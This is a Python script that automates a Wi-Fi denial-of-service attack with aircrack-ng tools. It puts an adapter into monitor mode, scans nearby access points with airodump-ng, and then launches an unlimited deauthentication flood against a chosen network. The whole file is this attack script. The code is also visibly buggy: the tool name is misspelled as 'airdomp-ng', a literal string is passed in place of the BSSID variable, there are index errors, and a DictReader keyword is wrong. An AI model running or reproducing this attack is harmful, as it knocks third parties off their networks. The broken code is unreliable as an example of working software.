import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

# create empty list
active_wireless_networks = []


def check_for_essid(essid, lst):
    check_status = True
    if (len(lst) == 0):
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
    return check_status


# Basic user interface
print(" To Whom Much is Given, Much is Expected")

if not 'SUDO_UID' in os.environ.keys():
    print("Please run this script with sudo")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/old_csv")
        except:
            print("Directory already exists")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/old_csv" +
                    str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("wlan[0-9] +")
check_wifi_result = wlan_pattern.findall(subprocess.run(
    ["iwconfig"], capture_output=True).stdout.decode("utf-8"))

# wifi adapter == false
if len(check_wifi_result) == 0:
    print("No wifi adapter found")
    exit()

print("Available wifi adapters: ")
for index, item in enumerate(check_wifi_result):
    print(f"{index + 1}. {item.strip()}")

while True:
    wifi_interface_choice = input("Please select a wifi adapter: ")
    try:
        if check_wifi_result[int(wifi_interface_choice) - 1]:
            break
    except:
        print("Invalid choice")

# hacknic doesnt mean anything
hacknic = check_wifi_result[(int(wifi_interface_choice))].strip()
print(f"Selected wifi adapter: {hacknic}")
kill_conflict_process = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# monitored mode
print("Initializing monitor mode")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

discover_access_points = subprocess.Popen([
    "sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldNames = ["BSSID", "First time seen", "Last time seen", "channel", "Speed", "Privacy",
                          "Cipher", "Authentication", "Power", "beacons", "IV", "LAN IP", "ID-length", "ESSID", "Key"]
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    # dickt reader
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldNames=fieldNames)
                    for row in csv_reader:
                        if row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
        print("Scanning for wireless networks...")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(
                f"{index + 1}  |\t{item['BSSID']}|\t{item['channel']}|\t{item['ESSID']}|")
        time.sleep(1)
except KeyboardInterrupt:
    print("Stopping scan")

while True:
    choice = input("Please select a network: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Invalid choice")

# selected network
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackChannel = active_wireless_networks[int(choice)]["channel"].strip()
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackChannel])
subprocess.Popen(["airdomp-ng", "--deauth", "0", "-a", "hackbssid", check_wifi_result[int(
    wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    while True:
        print("Deauthenticating...")
except KeyboardInterrupt:
    print("Stopping deauth")
    subprocess.run(
        ["airmon-ng", "stop", check_wifi_result[int(wifi_interface_choice)] + "mon"])
